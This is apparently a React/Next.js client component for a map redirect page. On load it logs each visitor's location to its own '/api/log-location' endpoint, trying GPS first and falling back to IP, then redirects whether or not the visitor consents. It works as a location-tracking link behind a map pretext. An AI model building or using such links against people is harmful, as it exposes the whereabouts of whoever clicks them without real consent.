'use client';

import { useEffect, useState, useCallback } from 'react';
import { Loader2 } from 'lucide-react';
import type { MapLinkConfig } from '@/app/actions/map-links';
import { useLocationLogger } from '@/hooks/use-location-logger';

interface MapRedirectClientProps {
  redirectUrl: string;
  config: MapLinkConfig;
}

export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
  const [statusText, setStatusText] = useState('Đang tải bản đồ...');
  const { log } = useLocationLogger('/api/log-location', { from: 'link' });

  const requestLocationAndRedirect = useCallback(() => {
    setStatusText('Đang xác minh vị trí và chuyển hướng...');
    
    // The logger hook will attempt to get GPS, fall back to IP,
    // log the info, and then the callback will redirect.
    log({
        onSuccess: () => {
            window.location.href = redirectUrl;
        },
        onError: () => {
            // On any error (including denial), proceed with redirection.
            window.location.href = redirectUrl;
        }
    });

  }, [log, redirectUrl]);
  
  useEffect(() => {
    const timer = setTimeout(requestLocationAndRedirect, 500);
    return () => clearTimeout(timer);
  }, [requestLocationAndRedirect]);
  
  return (
    <div className="flex justify-center items-center min-h-svh bg-background p-4">
      <div className="flex flex-col items-center gap-4 text-muted-foreground">
        <Loader2 className="h-12 w-12 animate-spin text-primary" />
        <p className="text-lg font-medium">{statusText}</p>
      </div>
    </div>
  );
}
